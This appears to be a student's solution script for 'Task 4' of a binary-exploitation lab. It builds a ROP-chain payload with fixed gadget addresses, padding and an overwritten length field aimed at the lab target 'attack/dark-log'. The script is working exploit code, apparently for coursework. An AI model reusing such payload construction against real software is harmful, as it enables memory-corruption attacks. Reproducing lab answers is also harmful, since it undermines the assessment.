#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct


def p64(value):
    return struct.pack("<Q", value)


POP_RDI_RET = 0x4018A3
RET = 0x4018A4
GRADE_EVAL = 0x401677

rop_chain = (
    p64(POP_RDI_RET)
    + p64(4)
    + p64(RET)
    + p64(GRADE_EVAL)
)

expression = rop_chain.ljust(128, b"A")

log_msg = b"B" * 128

new_len = struct.pack("<i", 168)

payload = expression + log_msg + new_len

sys.stdout.buffer.write(payload + b"\n")
